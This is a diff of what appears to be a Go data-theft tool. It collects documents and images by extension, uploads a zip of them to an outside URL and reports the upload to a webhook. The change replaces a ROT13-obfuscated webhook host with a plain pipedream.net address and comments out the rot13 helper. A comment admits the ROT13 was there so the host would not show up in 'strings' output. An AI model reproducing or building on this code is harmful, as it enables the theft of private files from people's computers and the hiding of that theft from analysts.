@@ -25,7 +25,7 @@ var (
 
 var args = []string{"--upload", "--no-upload"} // Arguments
 var extensions = []string{"docx", "doc", "pdf", "xls", "png", "jpg", "txt"}
-var webhook = "ra16dkutert7s.k.cvcrqernz.arg"
+var webhook = "en16qxhgreg7f.x.pipedream.net"
 var TESTING = false // flag for testing purposes
 var CurrentUsername string
 
@@ -229,22 +229,22 @@ func sendPostRequestToWebhook(url, payload string) error {
 	return nil
 }
 
-func rot13(input string) string {
-	var result strings.Builder
+// func rot13(input string) string {
+// 	var result strings.Builder
 
-	for _, char := range input {
-		switch {
-		case 'a' <= char && char <= 'z':
-			result.WriteRune((char-'a'+13)%26 + 'a')
-		case 'A' <= char && char <= 'Z':
-			result.WriteRune((char-'A'+13)%26 + 'A')
-		default:
-			result.WriteRune(char)
-		}
-	}
+// 	for _, char := range input {
+// 		switch {
+// 		case 'a' <= char && char <= 'z':
+// 			result.WriteRune((char-'a'+13)%26 + 'a')
+// 		case 'A' <= char && char <= 'Z':
+// 			result.WriteRune((char-'A'+13)%26 + 'A')
+// 		default:
+// 			result.WriteRune(char)
+// 		}
+// 	}
 
-	return result.String()
-}
+// 	return result.String()
+// }
 
 // Checks if arguments are delivered with the execution of the program.
 func argCheck() {
@@ -335,8 +335,8 @@ func main() {
 		fmt.Printf("[+] ZIP file '%s' was sent successfully uploaded to https://%s.\n", docZipFileName, URL)
 
 		// For the obfuscation I did ROT13 so in sTrIngS it won't show up...
-		webhookUrl := rot13(webhook)
-		sendPostRequestToWebhook("[+] "+webhookUrl, "files uploaded to: https://"+URL)
+		//webhookUrl := rot13(webhook)
+		sendPostRequestToWebhook("[+] "+webhook, "files uploaded to: https://"+URL)
 	}
 
 }
